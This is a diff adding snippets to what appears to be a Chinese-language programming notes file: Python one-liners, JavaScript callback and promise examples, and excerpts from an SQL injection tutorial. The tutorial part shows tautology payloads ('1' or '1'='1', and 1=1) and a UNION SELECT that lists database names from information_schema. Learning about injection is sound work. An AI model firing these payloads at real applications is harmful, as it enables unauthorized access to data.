@@ -438,3 +438,104 @@ https://bugs.php.net/bug.php?id=73871
 https://bugs.php.net/bug.php?id=73847
 是 opcache 导致的，我用循环生成数组，且键值加 md5 解决了
 ```
+###[震惊小伙伴的单行代码](http://www.vaikan.com/10-python-one-liners-to-impress-your-friends/)
+```js
+print sum(range(1,1001))
+print open("ten_one_liners.py").readlines()
+过滤列表中的数值
+
+print reduce(lambda(a,b),c: (a+[c],b) if c > 60 else (a,b + [c]), [49, 58, 76, 82, 88, 90],([],[]))
+获取XML web service数据并分析
+
+from xml.dom.minidom import parse, parseString
+import urllib2
+# 注意，我将它转换成XML格式化并打印出来
+print parse(urllib2.urlopen("http://search.twitter.com/search.atom?&q=python")).toprettyxml(encoding="utf-8")
+并行处理
+
+import multiprocessing
+import math
+
+print list(multiprocessing.Pool(processes=4).map(math.exp,range(1,11)))
+
+```
+###[SQL 注入详解](http://blog.jobbole.com/109784/)
+```js
+//原先要在数据库中执行的命令
+SELECT first_name, last_name FROM users WHERE user_id = '1'
+//变成
+SELECT first_name, last_name FROM users WHERE user_id = '1' or '1'='1'
+mysql> select * from students where TRUE ;
++-------+-------+-----+
+| id    | name  | age |
++-------+-------+-----+
+| 10056 | Doris |  20 |
+| 10058 | Jaune |  22 |
+| 10060 | Alisa |  29 |
++-------+-------+-----+
+3 rows in set (0.00 sec)
+
+mysql> select * from students where FALSE ;
+Empty set (0.00 sec)
+and 1=1 , and 1=2 即是 and TRUE , and FALSE 的变种。
+mysql> select name from students where id = -1 union select schema_name from information_schema.schemata;   //数据库名  
++--------------------+
+| name               |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| rumRaisin          |
+| t3st               |
+| test               |
++--------------------+
+6 rows in set (0.00 sec)
+```
+###[拿到JavaScript异步函数的返回值](https://zhuanlan.zhihu.com/p/24404144)
+```js
+<script>
+function getSomething() {
+	var r = 0;
+	setTimeout(function() {
+		r = 2;
+	}, 10);
+	return r;
+}
+
+function compute() {
+	var x = getSomething();
+	alert(x * 2);
+}
+compute();
+</script>
+
+function getSomething(cb) {
+	var r = 0;
+	setTimeout(function() {
+		r = 2;
+		cb(r);
+	}, 10);
+}
+
+function compute(x) {
+	alert(x * 2);
+}
+getSomething(compute);
+
+function getSomething() {
+	var r = 0;
+	return new Promise(function(resolve) {
+		setTimeout(function() {
+			r = 2;
+			resolve(r);
+		}, 10);
+	});
+}
+
+function compute(x) {
+	alert(x * 2);
+}
+getSomething().then(compute);
+
+ 
+```
